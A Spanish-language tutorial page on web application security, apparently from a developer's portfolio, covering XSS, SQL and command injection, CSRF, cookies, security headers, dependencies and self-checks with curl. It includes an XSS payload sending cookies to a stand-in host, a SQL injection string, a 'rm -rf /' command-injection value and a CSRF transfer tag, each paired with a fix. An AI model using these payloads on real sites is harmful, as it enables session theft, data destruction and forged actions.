@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Seguridad en aplicaciones web — Estudios de informática</title>
+  <meta name="description" content="Seguridad en aplicaciones web: XSS, inyección SQL, CSRF, validación de entradas, cabeceras de seguridad, cookies y dependencias.">
+  <link rel="icon" type="image/svg+xml" href="../../favicon.svg">
+  <link rel="stylesheet" href="../../stylesheets/base.css">
+  <link rel="stylesheet" href="../../stylesheets/enciclopedia.css">
+  <script src="../js/tema.js"></script>
+  <script src="../../javascripts/main.js" defer type="module"></script>
+  <script src="../js/copiar.js" defer></script>
+</head>
+<body id="HomePage" class="body-container">
+  <a class="saltar" href="#contenido" data-lang="skipToContent">Saltar al contenido</a>
+
+  <nav class="navbar">
+    <a href="../../index.html" class="logo-link" title="inicio" data-i18n-title="homeTitle">
+      <h1>Pablo Diaz</h1>
+      <h2 data-lang="web-developer">Desarrollador Web</h2>
+    </a>
+
+    <button class="btn" title="abrir menú" aria-expanded="false" aria-controls="sidebar" data-i18n-title="openMenu">
+      <span data-lang="menu">Menú</span>
+      <img src="../../assets/icons/menu.svg" alt="" />
+    </button>
+  </nav>
+
+  <div class="main-content">
+    <header class="cabecera">
+      <div class="contenedor cabecera__interior">
+        <p class="marca"><a href="../index.html">Estudios de informática</a></p>
+        <a class="volver-portafolio" href="../../index.html">← Volver al portafolio</a>
+      </div>
+    </header>
+
+    <main id="contenido" class="contenedor lectura">
+      <p class="volver"><a href="../index.html">← Volver al índice</a></p>
+
+      <article class="estudio">
+        <header class="estudio__cabecera">
+          <p class="estudio__categoria">Seguridad</p>
+          <h1>Seguridad en aplicaciones web</h1>
+          <p class="entrada">
+            Una aplicación web recibe datos de personas que no controlas y los muestra a personas que
+            tampoco controlas. La seguridad web es, ante todo, <strong>decidir qué datos son
+            confiables</strong> y tratar el resto como amenaza. Aquí verás los ataques más habituales,
+            cómo se explotan y cómo se previenen en tu propio código.
+          </p>
+        </header>
+
+        <nav class="tabla-contenido" aria-labelledby="toc-titulo">
+          <h2 id="toc-titulo">Contenido</h2>
+          <ol>
+            <li><a href="#mentalidad">La mentalidad: no confiar en la entrada</a></li>
+            <li><a href="#xss">XSS: inyección de código en el navegador</a></li>
+            <li><a href="#sql">Inyección SQL y de comandos</a></li>
+            <li><a href="#csrf">CSRF: peticiones falsas con tu sesión</a></li>
+            <li><a href="#validacion">Validar, sanear y escapar</a></li>
+            <li><a href="#cookies-sesiones">Cookies de sesión</a></li>
+            <li><a href="#cabeceras">Cabeceras de seguridad</a></li>
+            <li><a href="#dependencias">Dependencias y secretos</a></li>
+            <li><a href="#comprobaciones">Comprobar tu propia web</a></li>
+            <li><a href="#buenas-practicas">Buenas prácticas</a></li>
+            <li><a href="#ver-tambien">Ver también</a></li>
+          </ol>
+        </nav>
+
+        <section id="mentalidad" aria-labelledby="mentalidad-titulo">
+          <h2 id="mentalidad-titulo">La mentalidad: no confiar en la entrada</h2>
+          <p>
+            Todo dato que llega de fuera —formularios, parámetros de URL, cabeceras, cookies, respuestas
+            de API, archivos subidos— es <strong>dudoso por defecto</strong>. Aunque la interfaz valide
+            del lado del cliente, cualquiera puede enviar peticiones a mano con <code>curl</code>, así
+            que la única validación que cuenta es la del <em>servidor</em>.
+          </p>
+          <p class="nota">
+            La regla clásica: <em>«validar en la entrada, escapar en la salida»</em>. Comprueba que el
+            dato tenga la forma esperada cuando llega, y conviértelo en texto inofensivo justo antes de
+            usarlo, según el contexto donde vaya a terminar.
+          </p>
+        </section>
+
+        <section id="xss" aria-labelledby="xss-titulo">
+          <h2 id="xss-titulo">XSS: inyección de código en el navegador</h2>
+          <p>
+            Cross-Site Scripting ocurre cuando un dato del usuario termina interpretado como
+            JavaScript o HTML por el navegador de otra persona. El atacante ejecuta código
+            <em>en el origen de tu sitio</em>: puede leer el DOM, robar cookies y suplantar acciones.
+          </p>
+          <p>Ejemplo vulnerable — un comentario que se imprime sin escapar:</p>
+          <pre><code># El atacante escribe esto como "comentario"
+  &lt;script&gt;fetch('https://malo.ejemplo/?c=' + document.cookie)&lt;/script&gt;
+
+  // Renderizado SIN escapar: el script se ejecuta en cada visitante
+  document.innerHTML = 'Comentario: ' + comentario;   // ¡peligro!</code></pre>
+          <p>Versión segura: tratar el dato como texto, nunca como HTML:</p>
+          <pre><code>// textContent no interpreta etiquetas: el &lt;script&gt; queda como texto visible
+  const parrafo = document.createElement('p');
+  parrafo.textContent = 'Comentario: ' + comentario;  // seguro</code></pre>
+          <ul>
+            <li><strong>Reflejado</strong>: el dato malicioso viaja en la propia petición (URL, formulario).</li>
+            <li><strong>Almacenado</strong>: se guarda (base de datos) y ataca a todos los visitantes.</li>
+            <li><strong>DOM-based</strong>: el código cliente manipula el DOM con datos no confiables.</li>
+          </ul>
+          <p class="nota">
+            Prefiere APIs que asignan texto (<code>textContent</code>, <code>createTextNode</code>) a
+            las que asignan HTML (<code>innerHTML</code>, <code>insertAdjacentHTML</code>).
+            <code>innerHTML</code> solo con contenido que tú generaste, jamás con datos del usuario.
+          </p>
+        </section>
+
+        <section id="sql" aria-labelledby="sql-titulo">
+          <h2 id="sql-titulo">Inyección SQL y de comandos</h2>
+          <p>
+            Si concatenas entrada del usuario dentro de una sentencia SQL o de un comando del sistema,
+            el usuario puede cambiar lo que ejecutas. Es uno de los ataques más antiguos y sigue siendo
+            frecuente.
+          </p>
+          <p>Vulnerable: el usuario escribe <code>'' OR 1=1 --</code> como contraseña:</p>
+          <pre><code>const q = "SELECT * FROM usuarios WHERE nombre='" + nombre + "' AND clave='" + clave + "'";</code></pre>
+          <p>Seguro: la base de datos distingue el código de los datos por ti:</p>
+          <pre><code>// Consultas preparadas: los parámetros son datos, nunca código SQL
+  const filas = await db.query(
+    'SELECT id FROM usuarios WHERE nombre = ? AND clave = ?',
+    [nombre, clave]
+  );</code></pre>
+          <pre><code># INYECCIÓN DE COMANDOS: nunca interpolar entrada en un shell
+  # Peligro: entradas = "archivo.txt; rm -rf /"
+  exec('cat ' + entradas);
+
+  # Seguro: se pasa como argumento separado, sin que se interprete el ';'
+  execFile('cat', [entradas]);  // o validar la forma exacta esperada</code></pre>
+        </section>
+
+        <section id="csrf" aria-labelledby="csrf-titulo">
+          <h2 id="csrf-titulo">CSRF: peticiones falsas con tu sesión</h2>
+          <p>
+            Cross-Site Request Forgery aprovecha que el navegador envía automáticamente las cookies
+            (de sesión incluidas) a tu servidor, incluso cuando la petición la lanzó otro sitio. Si estás
+            autenticado, una página maliciosa puede hacer «clic por ti».
+          </p>
+          <pre><code><!-- En una página del atacante: tu navegador la carga y envía el form con tus cookies -->
+  &lt;img src="https://banco.ejemplo/transferir?cantidad=1000&amp;destino=atacante"&gt;</code></pre>
+          <p>Defensas habituales:</p>
+          <ul>
+            <li><strong>Token anti-CSRF</strong>: el servidor entrega un valor aleatorio que el formulario envía de vuelta; el atacante no puede leerlo desde otro origen.</li>
+            <li><strong>Cookies <code>SameSite</code></strong>: evita enviar la cookie en peticiones cross-site.</li>
+            <li><strong>No usar GET con efectos</strong>: acciones que cambian datos deben exigir POST/PUT/DELETE.</li>
+            <li>Revisar el encabezado <code>Origin</code> o <code>Referer</code> en cambios críticos.</li>
+          </ul>
+        </section>
+
+        <section id="validacion" aria-labelledby="validacion-titulo">
+          <h2 id="validacion-titulo">Validar, sanear y escapar</h2>
+          <p>Son tres operaciones distintas, no sinónimos:</p>
+          <table class="tabla">
+            <thead>
+              <tr>
+                <th scope="col">Operación</th>
+                <th scope="col">Qué hace</th>
+                <th scope="col">Ejemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td>Validar</td><td>Rechazar lo que no cumple el formato esperado</td><td>Email con <code>@</code>, edad numérica, id entero</td></tr>
+              <tr><td>Sanear</td><td>Limpiar el dato eliminando lo peligroso</td><td>Permitir HTML limitado en un editor</td></tr>
+              <tr><td>Escapar</td><td>Codificar el dato para el contexto de salida</td><td><code>&lt;</code> → <code>&amp;lt;</code> en HTML; <code>\'</code> en SQL sin preparadas</td></tr>
+            </tbody>
+          </table>
+          <p>
+            <strong>Lista blanca</strong> mejor que lista negra: define qué sí es permitido («solo
+            letras y números») en vez de intentar enumerar todo lo peligroso.
+          </p>
+          <pre><code>// Validar del lado del servidor, no solo en el cliente
+  const id = Number(req.params.id);
+  if (!Number.isInteger(id) || id <= 0) {
+    return res.status(400).json({ error: 'id inválido' });
+  }</code></pre>
+        </section>
+
+        <section id="cookies-sesiones" aria-labelledby="cookies-sesiones-titulo">
+          <h2 id="cookies-sesiones-titulo">Cookies de sesión</h2>
+          <p>
+            La cookie de sesión es la llave de la cuenta del usuario; configúrala para que sea difícil
+            que la roben o que la usen otros sitios:
+          </p>
+          <pre><code>Set-Cookie: sesión=abc123;
+  Secure;          // solo viaja por HTTPS
+  HttpOnly;        // JavaScript no puede leerla (mitiga el robo vía XSS)
+  SameSite=Lax;    // no se envía en peticiones cross-site habituales
+  Path=/;
+  Max-Age=3600;</code></pre>
+          <p>Además: rotar el identificador al iniciar sesión, caducar las sesiones inactivas y
+          invalidar la sesión en el servidor al cerrar sesión (no basta con borrar la cookie).</p>
+          <p class="nota">
+            <code>HttpOnly</code> no evita el XSS, pero le quita al atacante el objetivo más jugoso.
+            Las contraseñas y los datos sensibles van en el cuerpo de peticiones protegidas, nunca en
+            URLs ni en <code>localStorage</code> accesible a cualquier script de la página.
+          </p>
+        </section>
+
+        <section id="cabeceras" aria-labelledby="cabeceras-titulo">
+          <h2 id="cabeceras-titulo">Cabeceras de seguridad</h2>
+          <p>
+            El servidor instruye al navegador mediante cabeceras de respuesta. Son una segunda capa que
+            limita el daño si algo falla en tu código:
+          </p>
+          <table class="tabla">
+            <thead>
+              <tr>
+                <th scope="col">Cabecera</th>
+                <th scope="col">Para qué sirve</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td><code>Content-Security-Policy</code></td><td>Lista blanca de orígenes de scripts/estilos; la defensa más fuerte contra XSS.</td></tr>
+              <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>Evita que el navegador «adivine» tipos MIME y ejecute lo que no es.</td></tr>
+              <tr><td><code>frame-ancestors</code> (CSP) o <code>X-Frame-Options</code></td><td>Impide que tu sitio se incruste en otro (clickjacking).</td></tr>
+              <tr><td><code>Referrer-Policy</code></td><td>Controla cuánta URL de origen viaja a otros sitios.</td></tr>
+              <tr><td><code>Strict-Transport-Security</code></td><td>Obliga a usar HTTPS siempre (HSTS) para ese dominio.</td></tr>
+              <tr><td><code>Permissions-Policy</code></td><td>Desactiva APIs del navegador que no usas (cámara, geolocalización…).</td></tr>
+            </tbody>
+          </table>
+          <p>Ejemplo de política CSP para un sitio propio que no carga recursos externos:</p>
+          <pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self';
+  style-src 'self';
+  img-src 'self' data:;
+  frame-ancestors 'none';</code></pre>
+          <p class="nota">
+            Empieza en modo informe (<code>Content-Security-Policy-Report-Only</code>) para ver qué
+            bloquearía tu política antes de activarla, porque una CSP mal escrita rompe scripts legítimos.
+          </p>
+        </section>
+
+        <section id="dependencias" aria-labelledby="dependencias-titulo">
+          <h2 id="dependencias-titulo">Dependencias y secretos</h2>
+          <p>
+            Tu código es solo parte de la aplicación: la mitad del riesgo está en las librerías que
+            usas y en los secretos que la ponen en marcha.
+          </p>
+          <ul>
+            <li>Ten un <strong>lockfile</strong> (<code>package-lock.json</code>) y audítalo de vez en cuando.</li>
+            <li>Actualiza con regularidad: las vulnerabilidades conocidas se parchean, no se ignoran.</li>
+            <li>Menos dependencias = menos superficie de ataque.</li>
+          </ul>
+          <pre><code># Auditar dependencias de Node (reporta vulnerabilidades conocidas)
+  npm audit
+  npm audit fix
+
+# Comprobación equivalente en Python
+  pip-audit</code></pre>
+          <p>Los <strong>secretos</strong> (claves de API, credenciales de BD) viven fuera del
+          código: en variables de entorno o en un gestor de secretos. El repositorio es público para
+          siempre en cuanto se publica una vez; rota cualquier credencial que haya aparecido en él.</p>
+          <pre><code># .gitignore antes del primer commit
+  .env
+  *.pem
+  # busca en la historia si ya se colaron: git log -S 'API_KEY'</code></pre>
+        </section>
+
+        <section id="comprobaciones" aria-labelledby="comprobaciones-titulo">
+          <h2 id="comprobaciones-titulo">Comprobar tu propia web</h2>
+          <p>Ejercicios sencillos que puedes hacer hoy, contra tu propio sitio:</p>
+          <pre><code># 1) ¿Qué cabeceras de seguridad devuelvo?
+  curl -I https://tudominio.ejemplo/
+  curl -sI https://tudominio.ejemplo/ | grep -iE 'content-security|strict|x-frame|referrer'
+
+# 2) ¿Acepto peticiones de otros orígenes donde no debería? (comprobar CORS)
+  curl -sI -H 'Origin: https://otro-sitio.ejemplo' https://tudominio.ejemplo/api/datos \
+    | grep -i 'access-control-allow-origin'
+
+# 3) ¿Acepta mi API entradas absurdas sin rechazarlas?
+  curl -s "https://tudominio.ejemplo/api/buscar?q=%3Cscript%3E" | grep -i script
+
+# 4) ¿Qué cookies establece mi inicio de sesión?
+  curl -sI -X POST https://tudominio.ejemplo/login | grep -i set-cookie</code></pre>
+          <p class="nota">
+            Prueba solo sobre tus propios proyectos o con autorización explícita. Estos puntos de
+            verificación complementan <a href="estudios_criptografia.html#comandos">Ciberseguridad ·
+            Comandos de verificación</a> y <a href="estudios_tls.html#comandos">Ciberseguridad ·
+            Verificar certificados TLS</a>.
+          </p>
+        </section>
+
+        <section id="buenas-practicas" aria-labelledby="buenas-practicas-titulo">
+          <h2 id="buenas-practicas-titulo">Buenas prácticas</h2>
+          <ul>
+            <li>Escapa siempre en la salida y usa consultas preparadas en cada consulta SQL.</li>
+            <li>Valida del lado del servidor aunque el cliente también valide.</li>
+            <li>Errores genéricos al usuario, detalles solo en los registros; no filtres rutas ni versiones.</li>
+            <li>Minimiza permisos: las cookies de sesión llevan <code>HttpOnly</code> y <code>SameSite</code>.</li>
+            <li>Añade y revisa las cabeceras de seguridad; no todas necesitan herramientas externas.</li>
+            <li>Actualiza dependencias y rota credenciales; una clave filtrada caduca el día que se filtra.</li>
+            <li>Registra los fallos: lo que no se mide no se protege.</li>
+          </ul>
+        </section>
+
+        <section id="ver-tambien" aria-labelledby="ver-tambien-titulo">
+          <h2 id="ver-tambien-titulo">Ver también</h2>
+          <ul class="ver-tambien">
+            <li><a href="estudios_criptografia.html">Ciberseguridad · Criptografía básica</a>: hashes, cifrado y hashing de contraseñas.</li>
+            <li><a href="estudios_tls.html">Ciberseguridad · TLS y certificados</a>: el cifrado en tránsito de HTTPS.</li>
+            <li><a href="estudios_redes.html#http">Redes · HTTP</a>: dónde viajan los ataques y las cabeceras.</li>
+            <li><a href="estudios_javascript.html#asincronia">JavaScript · Asincronía</a>: el <code>fetch</code> que recibe los datos.</li>
+            <li><a href="estudios_html.html">HTML</a>: el marcado que puede verse infiltrado por XSS.</li>
+          </ul>
+        </section>
+      </article>
+
+      <p class="volver"><a href="../index.html">← Volver al índice</a></p>
+    </main>
+
+    <footer class="pie">
+      <div class="contenedor">
+        <p>Enciclopedia de informática · <a href="../index.html">Índice</a></p>
+      </div>
+    </footer>
+  </div>
+
+  <div class="sidebar-overlay"></div>
+
+  <aside class="sidebar" id="sidebar" aria-label="Menú de navegación">
+    <header class="sidebar-header">
+      <h2 data-lang="menu">Menú</h2>
+
+      <button class="btn btn-close" title="cerrar menú" data-i18n-title="closeMenu">
+        <span data-lang="close">Cerrar</span>
+        <img src="../../assets/icons/close.svg" alt="" />
+      </button>
+    </header>
+
+    <nav class="sidebar-menu">
+      <div class="sidebar-item--group">
+        <a class="sidebar-item" href="../../index.html#inicio">
+          <img src="../../assets/icons/home.svg" alt="" />
+          <span data-lang="home">Inicio</span>
+        </a>
+
+        <button class="sidebar-expand" type="button" aria-expanded="false" aria-controls="sidebar-secciones"
+          title="mostrar secciones" aria-label="mostrar secciones" data-i18n-title="showSections" data-i18n-aria-label="showSections">
+          <img class="sidebar-chevron" src="../../assets/icons/chevron_down.svg" alt="" />
+        </button>
+      </div>
+
+      <div class="sidebar-submenu" id="sidebar-secciones">
+        <a class="sidebar-item sidebar-subitem" href="../../index.html#experiencia">
+          <img src="../../assets/icons/docs.svg" alt="" />
+          <span data-lang="experienceTitle">Experiencia Laboral</span>
+        </a>
+
+        <a class="sidebar-item sidebar-subitem" href="../../index.html#estudios">
+          <img src="../../assets/icons/school.svg" alt="" />
+          <span data-lang="studiesTitle">Estudios | Cursos</span>
+        </a>
+
+        <a class="sidebar-item sidebar-subitem" href="../../index.html#proyectos">
+          <img src="../../assets/icons/code.svg" alt="" />
+          <span data-lang="projects">Proyectos</span>
+        </a>
+      </div>
+
+      <a class="sidebar-item active" href="../index.html">
+        <img src="../../assets/icons/menu_book.svg" alt="" />
+        <span data-lang="my-studies">Mis estudios</span>
+      </a>
+
+      <a class="sidebar-item" href="../../juegos/index.html">
+        <img src="../../assets/icons/gamepad.svg" alt="" />
+        <span data-lang="games">Juegos</span>
+      </a>
+    </nav>
+
+    <footer class="sidebar-footer">
+      <button class="btn btn-settings" title="Abrir configuración" data-i18n-title="openSettings">
+        <span data-lang="settings">Configuración</span>
+        <img src="../../assets/icons/setting.svg" alt="" />
+      </button>
+    </footer>
+  </aside>
+
+  <dialog class="modal-dialog" aria-modal="true" aria-labelledby="modal-title">
+    <button class="btn modal-close" title="Cerrar ventana (Esc)" aria-label="Cerrar ventana" data-i18n-title="closeWindowHint" data-i18n-aria-label="closeWindow">&times;</button>
+    <div class="modal-dialog-body"></div>
+  </dialog>
+</body>
+
+</html>
